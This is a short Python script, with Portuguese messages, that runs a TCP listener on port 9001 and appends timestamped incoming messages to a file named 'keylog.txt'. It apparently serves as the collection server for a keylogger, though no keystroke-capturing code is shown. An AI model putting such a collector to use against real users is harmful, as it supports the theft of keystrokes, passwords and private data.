import socket
from datetime import datetime

HOST = '0.0.0.0' 
PORT = 9001
LOG_FILE = 'keylog.txt'

def main():
    print(f"[*] Servidor de log iniciado. Escutando em {HOST}:{PORT}")
    print(f"[*] Pressione CTRL+C para parar.")
    print("-" * 30)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()

        while True:
            try:
                conn, addr = s.accept()
                with conn:
                    print(f"[*] Conexão recebida de {addr[0]}:{addr[1]}")

                    data = conn.recv(1024)
                    if not data:
                        continue

                    log_entry = data.decode('utf-8').strip()

                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

                    formatted_log = f"[{timestamp}] {log_entry}"

                    print(formatted_log)

                    with open(LOG_FILE, 'a') as f:
                        f.write(formatted_log + '\n')

            except KeyboardInterrupt:
                print("\n[*] Servidor interrompido pelo usuário. Fechando.")
                break
            except Exception as e:
                print(f"[ERRO] Ocorreu um erro: {e}")

if __name__ == '__main__':
    main()
